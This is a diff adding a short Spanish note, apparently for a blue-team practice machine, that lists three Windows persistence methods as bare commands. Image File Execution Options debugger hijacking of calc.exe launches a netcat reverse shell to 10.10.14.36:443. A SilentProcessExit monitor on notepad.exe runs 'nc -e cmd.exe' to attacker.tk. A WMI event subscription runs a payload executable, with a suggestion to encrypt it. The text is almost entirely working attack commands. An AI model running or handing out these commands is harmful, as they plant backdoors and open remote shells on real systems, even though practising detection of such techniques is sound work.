@@ -1,0 +1,17 @@
+# Maquina para practicar BLUE
+
+[+] First Way (NOT SAFE)
+cd C:\Windows\System32
+copy calc.exe _calc.exe
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & C:\Windows\Temp\PostExplotation\nc.exe cmd 10.10.14.36 443" /f
+
+[+] Second Way (NOT SAFE)
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc -e \windows\system32\cmd.exe attacker.tk 8888"
+
+[+] Third Way ([+] Safe)
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+# Necesitamos crearnos un .exe para lo siguiente, podremos encriptarlo con bowla
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\users\admin\meter.exe",CommandLineTemplate="C:\users\admin\meter.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""
